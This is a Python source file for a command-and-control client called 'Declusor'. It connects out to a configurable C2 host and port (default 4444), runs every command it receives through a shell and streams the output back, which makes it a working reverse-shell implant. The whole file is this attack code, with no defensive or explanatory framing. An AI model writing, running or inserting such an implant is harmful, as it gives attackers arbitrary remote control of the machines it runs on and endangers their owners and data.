#!/usr/bin/env python3
# -----------------------------------------------------------------------------
# Declusor Python Client
# Connects to a C2 server, reads null-terminated commands, executes them,
# and returns the output.
# -----------------------------------------------------------------------------

import socket
import subprocess
import os
import sys

# Configuration
HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", 4444))
ACKNOWLEDGE = os.environ.get("ACKNOWLEDGE", "ACK").encode()

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        buffer = b""
        while True:
            # Read until we find a null byte
            chunk = s.recv(1024)
            if not chunk:
                break
            buffer += chunk
            
            if b'\x00' in buffer:
                # Split commands by null byte
                commands = buffer.split(b'\x00')
                # The last element is either empty (if ended with \0) or incomplete
                buffer = commands.pop()
                
                for cmd_bytes in commands:
                    cmd = cmd_bytes.decode('utf-8', errors='ignore')
                    if not cmd:
                        continue
                        
                    try:
                        # Execute command
                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    except Exception as e:
                        output = str(e).encode()
                        
                    # Send output and ACK
                    s.sendall(output)
                    s.sendall(ACKNOWLEDGE)

    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()
